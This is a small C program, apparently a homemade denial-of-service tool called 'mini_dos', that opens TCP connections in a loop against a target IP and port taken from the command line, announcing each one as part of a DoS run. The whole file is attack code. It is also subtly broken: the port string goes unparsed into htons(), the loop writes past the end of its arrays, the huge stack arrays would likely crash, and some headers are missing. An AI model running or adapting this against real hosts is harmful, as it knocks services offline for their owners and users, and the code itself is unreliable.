#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

// Usage: ./mini_dos [IP] [PORT]

int main(int argc, char const *argv[]) {
	int s;
	int connection;

	struct sockaddr_in target;
	target.sin_family = AF_INET;	// AF_INET : TCP
	target.sin_port = htons(argv[2]);	// Port
	target.sin_addr.s_addr = inet_addr(argv[1]); // inet_addr translate address.

	int actual_sockets[999999];
	int actual_conns[999999];
	for (int i = 0;i <= 999999; i++) {
		actual_sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
		actual_conns[i] = connect(actual_sockets[i], (struct sockaddr *)&target, sizeof target); // Connection
		printf("[!] Running DoS against %s | Sockets: %d\n", argv[1], i);
	}
	return 0;
}
